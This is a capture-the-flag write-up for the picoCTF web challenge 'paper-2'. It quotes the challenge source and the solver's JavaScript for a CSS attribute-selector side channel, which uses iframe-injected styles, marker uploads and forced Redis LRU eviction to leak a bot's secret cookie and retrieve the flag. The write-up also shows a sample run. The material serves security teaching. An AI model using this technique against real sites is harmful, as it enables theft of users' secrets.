# paper-2

`paper-2` is a web challenge that, frustratingly, initially looks like it should fall to some kind of browser-code-execution trick. We control both uploaded bytes and uploaded MIME type, the bot is a real Chrome instance with a secret cookie, and the service will happily render whatever document type we upload. That makes PDF, SVG, XML, and other active-document routes look like the obvious attack surface, and we spent a lot of time testing exactly those ideas. The catch is that the browser is locked down hard enough that the clean JavaScript route never becomes the stable exploit. The real solve is a CSS side channel. The `/secret` endpoint reflects the secret into a DOM attribute, uploaded files are stored in Redis, and Redis is configured with `allkeys-lru`, so bot-touched marker files are more likely to survive eviction than untouched ones. The exploit path is to upload marker files, inject CSS selectors that fetch those markers only when parts of the secret match, force Redis eviction with padding uploads, infer the secret from the markers that survive, and finally query `/flag` with the recovered secret.

## Solve
The reason this challenge was so annoying is that the source keeps pushing us toward the wrong first idea.

In `index.ts`, the bot clearly looks like something we should be able to exploit through the browser. It launches Chrome, generates a fresh 16-byte hex secret, stores it in Redis, sets it as a cookie, and visits our uploaded file:

```ts
const secret = randomBytes(16).toString('hex');

await browser.setCookie({
    name: 'secret',
    value: secret,
    domain: host,
    sameSite: 'Strict'
});

const page = await browser.newPage();
await redis.set('secret', secret, 'EX', 60);
await page.goto(url);
await Bun.sleep(61000);
```

At the same time, the browser is heavily constrained:

```ts
await writeFile('/etc/opt/chrome/policies/managed/policy.json', JSON.stringify({
    'NetworkPredictionOptions': 2,
    'CACertificates': [ ... ],
    'URLBlocklist': ['*'],
    'URLAllowlist': [`https://${host}`]
}));
```

and:

```ts
args: [
    '--no-sandbox',
    '--disable-gpu',
    '--js-flags=--noexpose_wasm,--jitless',
    '--host-rules="MAP paper.local 127.0.0.1"'
],
```

Since we control the upload MIME type, we naturally tried to turn the browser into our execution engine through PDF, SVG, XML, and related document formats (the source really does make them look plausible). But they never turned into a reliable end-to-end exploit, so eventually we had to stop thinking in terms of how do we get JavaScript.

The real answer is hidden in `/secret`:

```ts
const secret = req.cookies.get('secret') || '0123456789abcdef'.repeat(2);
const payload = new URL(req.url, 'http://127.0.0.1').searchParams.get('payload') || '';

return new Response(
  `<body secret="${secret}">${secret}\n${payload}</body>`,
  headers('text/html')
);
```

We do not need JavaScript if the secret is already sitting in a CSS-addressable DOM attribute. That means we can test it with selectors like:

```css
body[secret*="abc"]
body[secret^="de"]
body[secret$="f0"]
```

The upload path gives us the second half of the exploit. Uploaded files are stored in Redis by ID and then replayed back through `/paper/:id`:

```ts
const id = await redis.incr('current-id');
const data = JSON.stringify([file.type, (await file.bytes()).toBase64()]);
await redis.set(`file|${id}`, data, 'EX', 10 * 60);
```

and:

```ts
const [type, data] = JSON.parse(res) as [string, string];
return new Response(Buffer.from(data, 'base64'), headers(type));
```

Then `docker-compose.yml` gives us the final clue:

```yaml
command: redis-server --maxmemory 512M --maxmemory-policy allkeys-lru --save "" --appendonly no
```

If a CSS rule causes the bot to request a marker file, that marker file becomes hotter in Redis than other untouched files. Under enough memory pressure, untouched files should disappear first. So instead of trying to execute code in the browser, we let the browser leak the secret through which files survive eviction.

We can generates CSS rules that request different marker IDs depending on whether a triplet, prefix, suffix, or exact candidate matches:

```js
function selectorRule(kind, token, slot, ids) {
  const selector =
    kind === 'triplet'
      ? `body[secret*="${token}"]`
      : kind === 'prefix'
        ? `body[secret^="${token}"]`
        : kind === 'suffix'
          ? `body[secret$="${token}"]`
          : `body[secret="${token}"]`;
  const prefix = kind === 'triplet' ? 't' : kind === 'prefix' ? 'p' : kind === 'suffix' ? 's' : 'e';
  return `${selector} #${prefix}${slot}{background-image:${ids.map((id) => `url(/paper/${id})`).join(',')}}`;
}
```

It then wraps those selectors inside frames that load `/secret?payload=...`, which is how we get our CSS to evaluate against the secret-bearing page:

```js
function framePayload(kind, cssId, count) {
  const prefix = kind === 'triplet' ? 't' : kind === 'prefix' ? 'p' : kind === 'suffix' ? 's' : 'e';
  const payload =
    `<style>@import url(/paper/${cssId});</style>` +
    Array.from({ length: count }, (_, idx) => `<i id="${prefix}${idx}"></i>`).join('');
  return `<!doctype html><iframe src="/secret?payload=${encodeURIComponent(payload)}"></iframe>`;
}
```

For stage one, we upload marker pools for every triplet and every two-character affix, then upload CSS frames that test them:

```js
const tripletIds = await uploadTokenMap(TRIPLETS, TRIPLET_MARKERS_PER_TOKEN, TRIPLET_MARKER_SIZE, 'triplet');
const prefixIds = await uploadTokenMap(BIGRAMS, AFFIX_MARKERS_PER_TOKEN, AFFIX_MARKER_SIZE, 'prefix');
const suffixIds = await uploadTokenMap(BIGRAMS, AFFIX_MARKERS_PER_TOKEN, AFFIX_MARKER_SIZE, 'suffix');
const tripletFrameIds = await uploadCssFrames('triplet', TRIPLETS, tripletIds, TRIPLET_RULES_PER_FRAME);
const prefixFrameIds = await uploadCssFrames('prefix', BIGRAMS, prefixIds, AFFIX_RULES_PER_FRAME);
const suffixFrameIds = await uploadCssFrames('suffix', BIGRAMS, suffixIds, AFFIX_RULES_PER_FRAME);
```

After the bot loads those pages, we deliberately cause memory pressure:

```js
async function doEvictionWave() {
  await uploadPaddingFiles(POSTFILL_FILES, 'postfill');
  await uploadPaddingFiles(EXTRA_EVICT_FILES, 'evict');
}
```

Then we harvest which marker files are still alive:

```js
async function harvestTokenScores(tokens, tokenMap) {
  const scores = new Map();
  for (const group of chunk(tokens, HARVEST_BATCH)) {
    const results = await Promise.all(group.map(async (token) => ({
      token,
      res: await Promise.all(tokenMap.get(token).map((id) => getPaper(id))),
    })));
    for (const { token, res } of results) {
      scores.set(token, res.reduce((count, item) => count + (item.status === 200 && item.body !== 'not found!' ? 1 : 0), 0));
    }
  }
  return scores;
}
```

That gives us scored triplets, prefixes, and suffixes. The solver then stitches those partial constraints together into full candidate secrets:

```js
const selected = pickCandidateSet(tripletScores, prefixes, suffixes);
console.log({
  threshold: selected.threshold,
  triplets: selected.triplets.size,
  candidates: selected.candidates.length,
  sample: selected.candidates.slice(0, 10),
});
```

If we are lucky and stage one leaves only one candidate, we can go straight to the flag:

```js
if (selected.candidates.length === 1) {
  const guess = selected.candidates[0];
  const flagRes = await fetch(`${BASE}/flag?secret=${guess}`);
  console.log('flag response', flagRes.status, await flagRes.text());
  return;
}
```

If not, we need to run a second exact-match stage using selectors of the form:

```css
body[secret="candidate"]
```

and repeats the same eviction-and-harvest trick until only one candidate survives.

In summary:

1. Notice that the MIME-type control makes PDF, SVG, and other active-document ideas tempting, and spend some time ruling those routes out.
2. Realize the challenge does not actually need JavaScript because `/secret` already exposes the secret as a CSS-addressable DOM attribute.
3. Notice that uploaded files live in Redis and that Redis uses `allkeys-lru`.
4. Use CSS `background-image` loads as secret-dependent accesses to uploaded marker files.
5. Flood Redis so recently touched marker files survive longer than untouched ones.
6. Recover the secret from the surviving triplets, prefixes, suffixes, and exact-match candidates.
7. Query `/flag` with the recovered secret.

E.g., one ran produced:

```text
{
  maxTripletScore: 2,
  maxPrefixScore: 4,
  maxSuffixScore: 4,
  prefixes: [ '8d' ],
  suffixes: [ '44', '94' ]
}
{
  threshold: 2,
  triplets: 39,
  candidates: 1,
  sample: [ '8d07ce0e1c8b88859d18010a84eab094' ]
}
flag response 200 picoCTF{i_l1ke_frames_on_my_canvas_xxxxxxx}
```
